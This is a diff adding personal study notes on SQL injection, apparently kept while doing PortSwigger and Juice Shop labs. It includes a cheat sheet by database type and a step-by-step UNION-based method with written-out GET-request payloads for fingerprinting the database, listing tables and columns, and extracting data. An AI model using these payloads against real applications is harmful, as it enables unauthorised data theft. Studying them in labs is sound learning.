@@ -281,6 +281,26 @@ until it's blank to check for opportunities
 
 ######## SQL Injections ########
 
+CheatSheet for:
+- Oracle
+- Microsoft
+- PostgreSQL
+- MySQL
+-- https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+Comment Symbols:
+Oracle: --
+Microsoft MySQL: #
+
+Version:
+Oracle: BANNER FROM V$version
+MySQL: @@version
+
+Default Table:
+All DB's Except Oracle: information_schema.tables/columns
+Oracle: all_tables/all_tab_columns
+
+
 - Start with input forms and use quotes to catch data entry errors
 -- single quote = '
 -- double quote = "
@@ -291,6 +311,7 @@ until it's blank to check for opportunities
 - 501: internal service network errors
 -- A 'true' statment must be made between the query quotes to not crash
 ------ input: asdf OR 1 = 1;# (# comments out org closing quote based on db type)
+
 - Checking the number of columns a table may have
 - SELECT * FROM users WHERE username =' UNION SELECT + NULL, NULL..;#
 --- GET/api/path=here'UNION+SELECT+NULL,NULL..-- (-- comments out remaining query)
@@ -299,10 +320,12 @@ until it's blank to check for opportunities
 ---- Union select will add onto the query
 ---- If this is successful that means there are 3 columns
 ---- if not then server may crash and there are less than 3 columns
+
 - Checking which colums except string data
 -- GET/api/path=here'UNION+SELECT+NULL,'test',NULL--
 ---- Enter single quote string data in place of each NULL in GET request
 ---- If HTTP 200 response code: respective column accepts string data
+
 - Pulling Down Information from DB table
 --- TIP: if I am querying on 2 columns but table has 3 I must include the NULL columns
 --- FROM: GET/api/path=here'UNION+SELECT+col1,col2,NULL--
@@ -310,8 +333,48 @@ until it's blank to check for opportunities
 ------- this is after knowing the column names
 ------- if UNION with another table:
 ----------- GET/api/path=here'UNION+SELECT+NULL+col1,+col2+FROM+table--
+
 -- Comb through the html to find table elements
 -- Union command will add results right on top of existing table data
+
+
+-- TIP: On Oracle datbase, every SELECT statment must specify a table to 
+select FROM
+---- If my UNION SELECT attact does not query fron a table 
+---- I will still need to include the FROM keyword folllowed by a valid name
+---- THere is a built in table on Oracle calle DUAL which I can use for this purpose
+--------- ex: 'UNION+SELECT 'abc' FROM DUAL
+--------- ex: GET/api/path=here'UNION+SELECT+NULL,NULL+FROM+DUAL
+
+
+- Pulling Down Database Type and Version
+---- Oracle
+-- GET/api/path=here'UNION+SELECT+NULL,NULL+FROM+DUAL--
+-- GET/api/path=here'UNION+SELECT+'test','test'+FROM+DUAL--
+-- GET/api/path=here'UNION+SELECT+BANNER,NULL+FROM+V$version--
+------ If all null test pass as compatible with string, only 1 is needed 
+to pull down the db Banner
+------ V$version table is specific to Oracle db
+---- MySQL
+-- GET/api/path=here'UNION+SELECT+NULL,NULL#
+-- GET/api/path=here'UNION+SELECT+'test','test'#
+-- GET/api/path=here'UNION+SELECT+@@version,NULL#
+------ @@version table is specific to MySQL db
+
+- Determining Name of Table and it's Columns then Retrieve Data
+-- First find out my column count and which are string compatible
+-- GET /api/path=here'UNION+SELECT+NULL,NULL--
+-- GET /api/path=here'UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
+---- Once I find the table name I'm looking for..
+-- GET /api/path=here'UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='my_table_name'--
+---- Retrieve data once I have my table and it's columsn..
+-- GET /api/path=here'UNION+SELECT+my_col_1,my_col_2+FROM+my_table--
+
+
+# Blind SQL Injection
+
+
+
 
 
 
@@ -320,8 +383,7 @@ $ Juice Shop
 
 $ Port Swigger
 - TODO: 
--- Lab: SQL injection UNION attack, retrieving multiple 
-values in a single column
+
 
 
 
